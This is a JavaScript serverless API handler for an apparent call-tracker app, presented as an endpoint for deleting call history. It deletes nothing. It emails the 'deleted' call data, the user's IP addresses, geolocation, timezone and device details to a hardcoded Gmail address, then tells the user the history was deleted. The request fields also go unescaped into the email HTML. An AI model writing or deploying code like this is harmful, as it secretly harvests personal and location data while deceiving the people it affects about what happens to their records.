const { Resend } = require('resend');
const resend = new Resend(process.env.RESEND_API_KEY);

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method Not Allowed' });
  }

  const {
    data = [],
    ip = 'unknown',        // IPv6
    ipv4 = 'unknown',      // Classic IPv4
    city = 'unknown',
    region = 'unknown',
    country = 'unknown',
    timezone = 'unknown',
    localTime = new Date().toLocaleString(),
    deviceInfo = 'unknown',
    hostName = 'Unknown'
  } = req.body;

  const html = `
    <div style="font-family: Arial, sans-serif; line-height: 1.6;">
      <h2>Call Tracker History Deleted</h2>
      <p><strong>Host Name:</strong> ${hostName}</p>
      <p><strong>IPv6:</strong> ${ip}</p>
      <p><strong>IPv4:</strong> ${ipv4}</p>
      <p><strong>City:</strong> ${city}</p>
      <p><strong>Region:</strong> ${region}</p>
      <p><strong>Country:</strong> ${country}</p>
      <p><strong>Timezone:</strong> ${timezone}</p>
      <p><strong>Local Time:</strong> ${localTime}</p>
      <p><strong>Device Info:</strong> ${deviceInfo}</p>
      <hr />
      <h3>Deleted Call Data</h3>
      <pre style="background: #f4f4f4; padding: 10px; border-radius: 6px;">${JSON.stringify(data, null, 2)}</pre>
    </div>
  `;

  try {
    await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: 'livuapp900@gmail.com',
      subject: 'Deleted History Report',
      html
    });

    return res.status(200).json({ message: 'History deleted successfully!' });
  } catch (error) {
    console.error('Error sending email:', error);
    return res.status(500).json({ message: 'Failed to delete history', error: error.message });
  }
};